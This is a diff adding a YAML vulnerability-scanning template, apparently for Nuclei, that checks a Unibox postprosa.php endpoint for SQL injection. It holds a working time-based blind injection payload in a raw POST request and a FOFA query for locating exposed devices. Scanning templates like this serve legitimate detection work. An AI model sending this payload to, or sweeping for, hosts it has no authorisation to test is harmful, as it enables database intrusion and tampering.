@@ -1,0 +1,40 @@
+id: unibox-postprosa-sqli
+
+info:
+  name: Unibox postprosa.php - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    Unibox postprosa.php contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+  reference:
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/unibox%E8%B7%AF%E7%94%B1%E5%99%A8/unibox%E8%B7%AF%E7%94%B1%E5%99%A8postprosa%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="Unibox" && body="Controller"
+  classification:
+    cwe-id: CWE-89
+  tags: Unibox
+
+http:
+  - raw:
+      - |
+        POST /api/postprosa.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+        Cookie: http304ok=0; PHPSESSID=pvpehubud7epklbme9m4s69b0q;
+        Connection: close
+
+        EM_OrderID=1'+AND+(SELECT+3676+FROM+(SELECT(SLEEP(2)))sdgB)+AND+'rBTA'%3d'rBTA
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - 'duration >= 6'
